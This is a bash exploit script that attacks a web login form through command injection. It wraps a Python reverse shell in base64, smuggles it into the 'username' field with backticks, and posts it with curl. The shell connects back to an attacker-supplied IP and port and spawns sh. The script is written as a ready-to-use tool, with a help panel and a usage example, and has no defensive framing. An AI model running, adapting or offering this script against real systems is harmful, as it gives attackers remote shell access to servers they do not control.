#!/bin/bash

function ctrl_c(){

  echo -e "\n\n [+] GoodBye...\n"
  tput cnorm && exit 1
}

#Ctrl+C

trap ctrl_c INT


# Help Panel

function helpPanel() {
  echo -e "Use:\n     ./exploit.sh <IP_ATTACKER> <PORT_ATTACKER> <URL_TARGET>\n"
  echo -e "example:\n    ./exploit.sh 192.168.1.5 4444 http://127.0.0.1/login$"
}


function exploit() {
  # IP_ATTACKER=$1
  # PORT_ATTACKER=$2
  # TARGET=$3

  # Encode Payload to BASE64
  payload=$(echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$1\",$2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'" | base64 | xargs)
  # removing spaces from the payload
  payload=$(echo $payload | tr -d ' ' | xargs)
  # INFO
  echo -e "\n[INFO] Sending reverse shell..."
  sleep 1
  # INFO
  echo -e "\n[INFO] the reverse shell has been sent. if you have errors, check the target or check the listening port...\n\n"
  sleep 2

  # Send reverse shell
  curl "$3" -d "username=;\`echo \"$payload\" | base64 -d | bash\`" 
}

# parameter validation

if [ -z "$1" ]; then
  helpPanel
elif [ -z "$2" ]; then 
  helpPanel
elif [ -z "$3" ]; then
  helpPanel
else
  tput civis
  exploit $1 $2 $3
  tput cnorm
fi
